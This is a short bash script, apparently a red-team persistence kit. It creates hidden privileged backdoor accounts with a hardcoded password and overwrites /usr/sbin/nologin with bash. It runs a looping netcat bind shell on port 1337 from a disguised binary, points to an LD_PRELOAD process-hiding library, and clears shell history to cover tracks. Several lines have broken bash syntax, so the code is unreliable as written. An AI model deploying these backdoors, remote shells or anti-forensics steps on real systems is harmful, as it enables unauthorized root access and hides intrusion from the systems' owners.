#/bin/bash

func legit_user{
	useradd -m -d /var/www/.apache_2 -s /usr/sbin/nologin -U apache_2
        echo -e "redTeamLovesYou\nredTeamLovesYou" |  passwd apache_2	

        usermod -aG sudo apache_2|| usermod -aG root apache_2
	cp /usr/bash /usr/sbin/nologin
}

func add_user(user){
	useradd -m -d /var/www/.$user -s /usr/sbin/nologin -U $user
	echo -e "redTeamLovesYou\nredTeamLovesYou" | passwd $user
        usermod -aG sudo $user || usermod -aG root $user
	cp /usr/bash /usr/sbin/nologin
}

func extra{
	users=$(wc -l /etc/passwd | cut -d " " -f 1)
	echo $users
	newint=$(expr $users / 2 )
	
}

#hiding processes
func ldPreload{
	#https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c
	echo "ldpreload"
}

func call_back{
        cp /bin/nc /.empty
	while:
	do
		echo "Press [CTRL+C] to stop.."
		/.empty -lvnp 1337 -w 15 -e /bin/bash
		sleep 1
	done	
}

#clearing bash history 
func final_touch{
	#Clears the variable which says where the history file is stored to so nothing is stored.#
	unset HISTFILE
	#Completely clear the history. Very visible as all history is now gone.#
	history -c
	#Set the number of commands written to the file to 10.#
	export HISTFILESIZE=10	
}
